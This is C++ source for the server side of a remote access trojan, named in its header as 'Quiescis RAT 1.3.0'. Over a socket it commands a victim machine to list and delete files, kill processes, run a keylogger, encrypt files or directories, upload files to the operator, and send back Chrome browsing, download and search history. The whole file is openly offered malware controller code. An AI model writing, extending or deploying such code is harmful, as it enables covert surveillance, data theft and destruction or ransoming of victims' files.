/*
 * Quiescis Remote Access Trojan 1.3.0
 * WARNING!
 * This software is the full property of the author
 * Copyright (c) 2020 by Nikait
 * Not intended for dumb kids
 *
 * server part
 *
 * compile for linux:
 * g++ Server.cpp -w
*/


#ifdef __linux__
	#include <arpa/inet.h>
	#include <unistd.h>
	#include <stdlib.h>

	#include "Menu.cpp"
	#include "Utils.cpp"
#else
	#include <winsock2.h>
	#include <windows.h>
#endif



#include <iostream>
#include <fstream>
#include <string>

#include "Menu.h"
#include "Config.h"
#include "Utils.h"


char buffer[100000];
std::string command, path, key;


int main() {
#ifdef __linux__
	system("clear");
#else
	system("cls");
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
#endif

	PrintGreeting();

#ifndef __linux__
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	if (WSAStartup(DLLVersion, &wsaData) != 0) {
		std::cout << "Error WSAStartup\n";
		exit(1);
	}

	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr(IP);
	addr.sin_port = htons(PORT);
	addr.sin_family = AF_INET;
	
	SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL);
	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
	if (!bind) throw_error("binding error");
	listen(sListen, SOMAXCONN);

	timenow();
	std::cout << " platform: ";
	SetConsoleTextAttribute(hConsole, 3);
	std::cout << "windows\n";
	SetConsoleTextAttribute(hConsole, 7);
	timenow();
	std::cout << " [";
	SetConsoleTextAttribute(hConsole, 4);
	std::cout << "start";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "] server ";
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << IP;
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << ":";
	SetConsoleTextAttribute(hConsole, 12);
	std::cout << PORT << std::endl;
	SetConsoleTextAttribute(hConsole, 7);

	timenow();
	std::cout << " listening ...\n";
	SOCKET conn = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);
	
#elif __linux__
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = inet_addr(IP);
	bind(sock, (struct sockaddr*)&addr, sizeof(addr));
	if (!bind) throw_error("binding error");
	listen(sock, 1);
	timenow();
	std::cout << " platform:" << wh_blue << " linux\n" << st_end;
	timenow();
	std::cout << " [" << red << "start" << st_end << "] server " << green << IP << st_end << ":" << red << PORT << st_end << std::endl;
	timenow();
	std::cout << " listening ...\n";
	int conn = accept(sock, (struct sockaddr *) NULL, NULL);
	
#endif

	if (!conn) throw_error("accept < 1");
	else {
		timenow();
		std::cout << " Sucessful Connected!\ntype help to print HELP [MENU]\n";
		while (true) {
			memset(&buffer, 0x0, sizeof(buffer));

			timenow();
			std::cout << " command";
#ifndef __linux__
			SetConsoleTextAttribute(hConsole, 13);
			std::cout << " => ";
			SetConsoleTextAttribute(hConsole, 7);
#else
			std::cout << " => ";
#endif
			std::getline(std::cin, command);

			if (command == "ls") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "rm") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "rmdir") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter path => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "info") {
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "ps") {
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "kill") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter name => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "pwd") {
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}
			
			else if (command == "keylogger") {
				send(conn, "keylogger", sizeof("keylogger"), NULL);
				std::cout << "how many characters should record? => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "activate keylogger!\nwait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "cryptfile") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "path to file => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), path.length(), NULL);
				std::cout << "key (int 1-100) => ";
				std::getline(std::cin, key);
				send(conn, key.c_str(), sizeof(key), NULL);
				std::cout << "wait ...\n";

				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "cryptdir") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "path to directory => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), path.length(), NULL);
				std::cout << "key (int 1-100) => ";
				std::getline(std::cin, key);
				send(conn, key.c_str(), sizeof(key), NULL);
				std::cout << "wait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);
				std::cout << buffer << std::endl;
			}

			else if (command == "download") {
				std::string file_name;
				std::cout << "name of file => ";
				std::getline(std::cin, file_name);
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "full path to file => ";
				std::getline(std::cin, path);

				// get file name
				std::string temp_file_name;
				for (unsigned int item = 0; item < path.length(); ++item) {
					if ((path[item] == '\\') || (path[item] == '/')) {
						temp_file_name = "";
						for (unsigned int i = item+1; i < path.length(); ++i) {
							temp_file_name += path[i];
						}
					}
				}

				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "wait ...\n";
				recv(conn, buffer, sizeof(buffer), NULL);

				// make the folder "downloads"
				if (!dirExists("downloads"))
#ifndef __linux__
				 _wmkdir(L"downloads");
#else
				system("mkdir downloads");
#endif
				if (!strcmp(buffer, "exist")) {
					timenow();
					std::cout << " file exist\n";
				}
				else {
					std::ofstream wr("downloads\\" + temp_file_name, std::ios::binary);
					wr << buffer;
					timenow();
					std::cout << " download: /downloads/" << temp_file_name << " succes\n";
				}
			}

			else if (command == "shutdown") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "ok\n";
				return 0;
			}

			else if (command == "error") {
				send(conn, command.c_str(), sizeof(command), NULL);
				std::cout << "enter name error => ";
				std::getline(std::cin, path);
				send(conn, path.c_str(), sizeof(path), NULL);
				std::cout << "ok\n";
			}

			else if (command == "chrome_st") {
#if chrome_stealer
				send(conn, command.c_str(), sizeof(command), NULL);
				recv(conn, buffer, sizeof(buffer), NULL);

				if (!dirExists("chrome")) _wmkdir(L"chrome");

				if (strncmp(buffer, "none", 4)) {
					std::ofstream history("chrome\\history.txt");
					history << buffer;
					timenow();
					std::cout << " history write chrome\\history.txt" << std::endl;
					history.close();
				} else {
					timenow();
					std::cout << " null history";
				}
				
				Sleep(1000);

				memset(&buffer, 0x0, sizeof(buffer));
				recv(conn, buffer, sizeof(buffer), NULL);
				if (strncmp(buffer, "none", 4)) {
					std::ofstream downloads("chrome\\downloads.txt");
					downloads << buffer;
					timenow();
					std::cout << " downloads write chrome\\downloads.txt" << std::endl;
					downloads.close();
				} else {
					timenow();
					std::cout << " null downloads";
				}

				Sleep(1000);

				memset(&buffer, 0x0, sizeof(buffer));
				recv(conn, buffer, sizeof(buffer), NULL);
				if (strncmp(buffer, "none", 4)) {
					std::ofstream requests("chrome\\search_history.txt");
					requests << buffer;
					timenow();
					std::cout << " search_history write chrome\\search_history.txt" << std::endl;
					requests.close();
				} else {
					timenow();
					std::cout << " null search_history";
				}
#else
				std::cout << "not supported\n";
#endif // chrome_stealer
			}

			else if (command == "close") {
				send(conn, command.c_str(), sizeof(command), NULL);
				timenow();
#ifndef __linux__
				SetConsoleTextAttribute(hConsole, 12);
				std::cout << " close connection\n";
				SetConsoleTextAttribute(hConsole, 7);
#else
				std::cout << red << " close connection\n" << st_end;
#endif
				return 1;
			}

			else if (command == "help") HelpMenu();

			else std::cout << "command not found\n";
		}
	}
	return 0;
}

